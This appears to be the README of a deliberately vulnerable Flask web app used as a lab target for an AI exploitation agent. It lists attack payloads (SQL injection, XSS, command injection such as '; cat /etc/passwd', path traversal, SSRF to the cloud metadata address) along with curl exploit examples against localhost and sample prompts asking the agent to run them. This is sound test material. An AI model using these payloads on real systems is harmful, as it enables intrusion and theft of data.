# Panda Vuln App — Agent Test Target

Intentionally vulnerable Flask web application for testing the PandaExploit AI agent. Designed to exercise the full recon → vuln scan → exploitation pipeline.

> **WARNING**: Contains real vulnerabilities. Deploy only in isolated environments for authorized testing.

---

## Vulnerabilities

| Type | Endpoint | Parameter | Exploit |
|------|----------|-----------|---------|
| **SQL Injection** | `/login` | username, password | `' OR '1'='1` |
| **SQL Injection** | `/users` | id | `1 OR 1=1` |
| **SQL Injection** | `/search` | q | `' UNION SELECT 1,2,3,4--` |
| **Reflected XSS** | `/echo` | msg | `<script>alert(1)</script>` |
| **Reflected XSS** | `/search` | q | (via error message) |
| **Stored XSS** | `/comments` | content, author | Post `<script>alert(1)</script>` |
| **Command Injection** | `/ping` | host | `127.0.0.1; id` or `\`id\`` |
| **Command Injection** | `/whois` | domain | `example.com; cat /etc/passwd` |
| **Path Traversal** | `/file` | path | `../../../etc/passwd` or `/etc/passwd` |
| **SSRF** | `/fetch` | url | `http://169.254.169.254/latest/meta-data/` |
| **Info Disclosure** | `/debug` | — | Returns env, secrets |
| **Sensitive Data** | `/admin/api-keys` | — | Fake API keys |
| **Default Creds** | `/login` | — | admin / admin |

---

## Quick Start (Local)

```bash
cd guinea_pigs/panda_vuln_app
docker compose up -d
curl http://localhost:5002/health
```

---

## PandaExploit Integration

### 1. Start the vulnerable app

```bash
cd guinea_pigs/panda_vuln_app
docker compose up -d
```

### 2. Create a PandaExploit project

1. Open **http://localhost:3000**
2. Create a new project
3. Set **Target Domain** to:
   - **Local**: `localhost` (recon uses host network)
   - **Docker on host**: Use your host IP or `host.docker.internal` if agent runs in Docker
4. **Subdomain list**: Add `.` to scan root domain only (faster)
5. Enable: Domain discovery, Port scan, HTTP probe, Resource enum, Vuln scan

### 3. Target configuration for local testing

| Scenario | Target Domain | Notes |
|----------|---------------|-------|
| Recon container (host network) | `localhost` | Recon reaches localhost:5002 |
| Agent in Docker | `host.docker.internal` | MCP tools reach host |
| Remote EC2/VM | Your server IP | Deploy via `scp` + `setup.sh` |

### 4. Run recon

Click **Start Recon**. The pipeline will:

1. **Port scan** → Find port 5002
2. **HTTP probe** → Detect Flask, get URLs
3. **Resource enum** → Katana crawls nav links, discovers `/search?q=`, `/ping?host=`, etc.
4. **Vuln scan** → Nuclei DAST tests parameters (XSS, SQLi templates)

### 5. Agent testing

After recon completes, use the AI chat:

- *"What vulnerabilities did we find?"*
- *"Try the SQL injection on the login page"*
- *"Test the command injection on /ping"*
- *"Can you read /etc/passwd via the file endpoint?"*

---

## Endpoints (for Katana crawling)

All linked from the nav bar for discovery:

- `/` — Home
- `/search?q=test` — Search (SQLi, XSS)
- `/ping?host=127.0.0.1` — Ping (RCE)
- `/whois?domain=example.com` — Whois (RCE)
- `/file?path=readme.txt` — File viewer (path traversal)
- `/fetch?url=http://example.com` — URL fetcher (SSRF)
- `/echo?msg=hello` — Echo (XSS)
- `/login` — Login form (SQLi)
- `/users?id=1` — User lookup (SQLi)
- `/comments` — Comments (stored XSS)
- `/debug` — Debug info (JSON)
- `/admin` — Admin panel
- `/admin/api-keys` — Exposed keys (JSON)
- `/health` — Health check

---

## Manual exploit examples

```bash
# SQLi login bypass
curl -X POST http://localhost:5002/login -d "username=' OR '1'='1&password=x"

# Path traversal
curl "http://localhost:5002/file?path=../../../etc/passwd"

# Command injection
curl "http://localhost:5002/ping?host=127.0.0.1;id"

# XSS
curl "http://localhost:5002/echo?msg=<script>alert(1)</script>"
```

---

## Cleanup

```bash
docker compose down
```
